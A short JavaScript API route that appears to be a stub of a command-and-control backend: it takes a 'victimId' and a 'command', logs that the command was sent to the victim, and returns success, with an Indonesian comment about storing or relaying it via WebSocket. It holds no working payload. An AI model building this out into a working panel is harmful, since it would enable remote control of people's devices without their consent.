// api/command.js
export default function handler(req, res) {
    if(req.method === 'POST') {
        const { victimId, command } = req.body;
        
        // Process command (simpan ke database, kirim via WebSocket, dll)
        console.log(`Command sent to ${victimId}: ${command}`);
        
        res.status(200).json({ 
            status: 'success', 
            message: `Command ${command} sent to victim ${victimId}` 
        });
    }
}